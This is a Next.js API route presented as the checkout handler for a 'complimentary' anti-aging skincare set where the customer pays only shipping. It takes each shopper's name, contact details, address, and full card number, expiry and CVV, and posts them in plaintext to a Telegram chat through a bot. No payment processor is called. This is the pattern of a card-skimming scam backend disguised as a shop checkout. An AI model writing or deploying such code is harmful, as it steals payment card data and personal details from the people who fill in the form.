import { NextRequest, NextResponse } from "next/server";

export async function POST(request: NextRequest) {
  try {
    const checkoutData = await request.json();
    
    // Validate required data structure
    if (!checkoutData || typeof checkoutData !== 'object') {
      return NextResponse.json(
        { error: "Invalid checkout data format" },
        { status: 400 }
      );
    }

    // Get Telegram bot token and chat ID from environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Missing Telegram configuration:", { 
        hasToken: !!botToken, 
        hasChatId: !!chatId 
      });
      return NextResponse.json(
        { error: "Telegram bot configuration is missing" },
        { status: 500 }
      );
    }

    // Format the checkout data into a readable message
    const message = formatCheckoutMessage(checkoutData);
    
    // Validate message is not empty
    if (!message || message.trim().length === 0) {
      console.error("Empty message generated from checkout data");
      return NextResponse.json(
        { error: "Failed to format checkout message" },
        { status: 500 }
      );
    }

    // Send message to Telegram
    // Convert chat_id to number if it's numeric, otherwise keep as string (for usernames)
    const chatIdValue = /^\d+$/.test(chatId) ? parseInt(chatId, 10) : chatId;
    
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const requestBody = {
      chat_id: chatIdValue,
      text: message,
      parse_mode: "HTML",
    };
    
    console.log("Sending to Telegram:", { 
      url: telegramUrl.replace(botToken, "***"), 
      chatId: chatIdValue 
    });
    
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(requestBody),
    });

    if (!response.ok) {
      let errorData;
      try {
        errorData = await response.json();
      } catch {
        errorData = { description: await response.text() };
      }
      console.error("Telegram API error:", errorData);
      
      // Provide helpful error messages
      let errorMessage = errorData.description || "Unknown error";
      let helpfulHint = "";
      
      if (errorMessage.includes("chat not found")) {
        helpfulHint = "Make sure you've sent at least one message to your bot first. Then get your chat ID from: https://api.telegram.org/bot" + botToken + "/getUpdates";
      } else if (errorMessage.includes("Unauthorized")) {
        helpfulHint = "Check that your TELEGRAM_BOT_TOKEN is correct";
      }
      
      return NextResponse.json(
        { 
          error: "Failed to send message to Telegram",
          details: errorMessage,
          hint: helpfulHint
        },
        { status: 500 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    const errorMessage = error instanceof Error ? error.message : "Unknown error";
    return NextResponse.json(
      { 
        error: "Internal server error",
        details: errorMessage
      },
      { status: 500 }
    );
  }
}

function formatCheckoutMessage(data: any): string {
  const {
    formData,
    deliveryMethod,
    paymentMethod,
    productValue,
    shippingCost,
    expressCost,
    total,
  } = data;

  let message = "<b>✨ New AETHER Order</b>\n\n";

  // Product Information
  message += "<b>🎁 Product:</b>\n";
  message += "Complete Anti-Aging Skincare System\n";
  message += "3-Product Complimentary Experience Set\n";
  message += `Collection Value: £${(productValue || 135).toFixed(2)}\n\n`;

  // Contact Information
  message += "<b>📧 Contact Information:</b>\n";
  message += `Email: ${formData?.email || "N/A"}\n`;
  message += `Phone: ${formData?.phone || "N/A"}\n\n`;

  // Delivery Address
  message += "<b>📍 Delivery Address:</b>\n";
  message += `Name: ${formData?.firstName || ""} ${formData?.lastName || ""}\n`;
  message += `Address: ${formData?.address || "N/A"}\n`;
  message += `City: ${formData?.city || "N/A"}\n`;
  message += `Postcode: ${formData?.postcode || "N/A"}\n\n`;

  // Delivery Method
  message += "<b>🚚 Delivery Method:</b>\n";
  message +=
    deliveryMethod === "express"
      ? "Express Delivery (Next business day) - £4.99\n"
      : "Standard Delivery (2-3 business days)\n";
  message += "\n";

  // Payment Information
  message += "<b>💳 Payment Method:</b>\n";
  if (paymentMethod === "card") {
    message += "Card Payment\n";
    message += `Name on Card: ${formData?.nameOnCard || "N/A"}\n`;
    message += `Card Number: ${formData?.cardNumber || "N/A"}\n`;
    message += `Expiry: ${formData?.expiry || "N/A"}\n`;
    message += `CVV: ${formData?.cvv || "N/A"}\n`;
  } else if (paymentMethod === "paypal") {
    message += "PayPal\n";
  } else if (paymentMethod === "applepay") {
    message += "Apple Pay\n";
  }
  message += "\n";

  // Order Summary
  message += "<b>💰 Order Summary:</b>\n";
  message += `Experience Set: Complimentary (£${(productValue || 135).toFixed(2)} value)\n`;
  message += `Shipping: £${(shippingCost || 9.95).toFixed(2)}\n`;
  if (expressCost && expressCost > 0) {
    message += `Express Upgrade: £${expressCost.toFixed(2)}\n`;
  }
  message += `<b>Customer Pays: £${(total || 9.95).toFixed(2)}</b>\n`;

  return message;
}
